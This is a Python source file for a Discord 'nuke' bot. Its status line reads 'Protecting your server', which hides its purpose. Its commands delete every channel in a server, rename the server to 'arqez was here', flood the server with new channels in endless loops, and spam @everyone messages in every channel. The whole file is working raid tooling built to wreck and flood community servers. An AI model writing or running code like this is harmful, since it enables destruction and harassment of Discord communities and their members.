import asyncio
import time
import logging
import aiohttp
import colorama
import random
import os
import requests
from colorama import Fore, Style, init
import discord
from discord import Permissions
from discord import Webhook, AsyncWebhookAdapter
from discord.ext import commands, tasks
from discord.ext.commands import Bot
from discord.ext.commands import *
from colorama import Fore as c
from colorama import Style as S
import sys
import json


token = "YOUR_BOTS_TOKEN_HERE"
bio = ['s!help', 'Protecting your server']
channel_names = ['arqez was here', "arqez owns you"]

print(f'){Fore.LIGHTMAGENTA_EX}connecting to bot')
os.system("cls")

prefix = "$"

client = commands.Bot(command_prefix=prefix)

@client.event
async def on_connect():
    print(f"{client.user} is online!")


@client.event 
async def on_ready():
     await client.change_presence(
         activity=discord.Activity(
                type=discord.ActivityType.streaming, name=random.choice(bio)))

@client.command(pass_context=True)
async def nuke(ctx):
    guild = ctx.message.guild
    await ctx.message.delete()

    for channel in list(ctx.message.guild.channels):
        try:
            await channel.delete()
            print(f"{channel.name} Has been succesfully deleted.")
        except:
            pass 

    for i in range (1):
        try:
            await ctx.guild.edit(name="arqez was here")
            print("Name changed.")
        except:
            print("Name wasn't changed.")

    for i in range(1):
        await guild.create_text_channel(random.choice(channel_names))
        while True:
            for channel in guild.text_channels:
                for i in range(500):
                    await guild.create_text_channel(random.choice(channel_names))

@client.command(pass_context=True)
async def cdel(ctx):
    await ctx.message.delete()

    for channel in list(ctx.message.guild.channels):
        try:
            await channel.delete()
            print(f"{channel.name} Has been succesfully deleted.")
        except:
            pass 

@client.command(pass_context=True)
async def ccr(ctx):
    guild = ctx.message.guild
    await ctx.message.delete()
    for i in range(1):
        await guild.create_text_channel(random.choice(channel_names))
        while True:
            for channel in guild.text_channels:
                for i in range(500):
                    await guild.create_text_channel(random.choice(channel_names))

@client.command(pass_context=True)
async def spam(ctx):
    guild = ctx.message.guild
    await ctx.message.delete()
    for i in range(2):
        print("Spammed channels succesfully.")
        while True:
            for channel in guild.text_channels:
                await channel.send("@everyone <3 https://media.discordapp.net/attachments/741445211242233898/820060221375643648/caption.gif")


client.run(token)


